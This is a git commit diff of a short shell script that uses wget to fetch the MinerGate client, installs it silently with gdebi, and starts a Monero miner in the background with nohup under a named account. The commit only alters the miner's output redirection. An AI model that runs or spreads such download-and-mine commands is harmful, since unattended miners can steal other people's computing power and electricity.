d4fa9aa970d563f2b9acdaf6b085d69e2e9bb1cf
ba3walos99 <38079309+ba3walos99@users.noreply.github.com>
2019-05-30 05:23:07 +0200

    Update and rename tr.sh to vl.sh

--- vl.sh
+++ vl.sh
@@ -1,2 +1,2 @@
 wget https://minergate.com/download/xfast-ubuntu-cli-amd && mv xfast-ubuntu-cli-amd minergate-cli-release.deb && apt-get -y update && apt-get -y install gdebi && yes Y | gdebi minergate-cli-release.deb
-nohup minergate-cli -u mgrate888@gmail.com --xmr &>a & &>b
+nohup minergate-cli -u mgrate888@gmail.com --xmr 2>1 & 1>1
